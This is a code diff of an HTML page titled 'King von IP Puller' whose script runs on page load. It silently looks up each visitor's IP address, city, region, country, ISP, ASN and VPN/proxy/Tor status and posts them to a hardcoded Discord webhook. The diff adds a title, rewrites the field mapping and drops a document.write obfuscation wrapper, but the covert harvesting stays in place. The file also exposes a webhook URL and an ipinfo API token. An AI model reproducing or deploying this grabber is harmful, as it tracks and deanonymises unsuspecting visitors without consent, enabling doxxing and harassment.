@@ -1,69 +1,32 @@
-<script language="javascript">
-    <!--
-    document.write(unescape('<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>King von IP Puller</title>
 </head>
 <body>
     <script>
     async function sendToDiscord(ipInfo) {
         const webhookURL = 'https://discord.com/api/webhooks/1308891035342213120/TbQOU164hVD4wWZ7kle5tqIXpS9_lU3P7fUXmlYw7fTBm5Av8Zki7-Cw9D4dZd530xvr';
         const discordMessage = {
-            content: "@everyone" ,
+            content: "@everyone", 
             embeds: [
                 {
                     image: {
                         url: "https://www.rollingstone.com/wp-content/uploads/2022/02/king-von-posthumous-album.jpg"
                     },
-                    title: "King von IP puller =",
+                    title: "King von IP puller",
                     fields: [
-                        {
-                            name: "IP Address", 
-                            value: ipInfo.data.ip, 
-                            inline: true
-                        },
-                        {
-                            name: "City", 
-                            value: ipInfo.data.city, 
-                            inline: true
-                        },
-                        {
-                            name: "State", 
-                            value: ipInfo.data.region || "N/A", 
-                            inline: true
-                        },
-                        {
-                            name: "Country", 
-                            value: ipInfo.data.country, 
-                            inline: true
-                        },
-                        {
-                            name: "Organization", 
-                            value: ipInfo.data.org, 
-                            inline: true
-                        },
-                        {
-                            name: "ASN Name", 
-                            value: ipInfo.data.asn.name, 
-                            inline: true
-                        },
-                        {
-                            name: "VPN", 
-                            value: ipInfo.data.privacy.vpn ? "True" : "False", 
-                            inline: true
-                        },
-                        {
-                            name: "Proxy", 
-                            value: ipInfo.data.privacy.proxy ? "True" : "False", 
-                            inline: true
-                        },
-                        {
-                            name: "TOR", 
-                            value: ipInfo.data.privacy.tor ? "True" : "False", 
-                            inline: true
-                        },
+                        { name: "IP Address", value: ipInfo.ip, inline: true },
+                        { name: "City", value: ipInfo.city, inline: true },
+                        { name: "State", value: ipInfo.region || "N/A", inline: true },
+                        { name: "Country", value: ipInfo.country, inline: true },
+                        { name: "Organization", value: ipInfo.org, inline: true },
+                        { name: "ASN Name", value: ipInfo.asn || "N/A", inline: true },
+                        { name: "VPN", value: ipInfo.privacy?.vpn ? "True" : "False", inline: true },
+                        { name: "Proxy", value: ipInfo.privacy?.proxy ? "True" : "False", inline: true },
+                        { name: "TOR", value: ipInfo.privacy?.tor ? "True" : "False", inline: true },
                     ],
                     color: 0x007BFF,
                     footer: {
@@ -87,7 +50,7 @@
         const ipData = await ipResponse.json();
         const userIP = ipData.ip;
 
-        const ipInfoResponse = await fetch(`https://ipinfo.io/widget/demo/${userIP}`);
+        const ipInfoResponse = await fetch(`https://ipinfo.io/${userIP}/json?token=5f02d3fa0f98e2`);
         const ipInfo = await ipInfoResponse.json();
 
         await sendToDiscord(ipInfo);
@@ -96,6 +59,4 @@
     getVisitorInfo();
     </script>
 </body>
-</html>'));
-    //-->
-</script>
+</html>
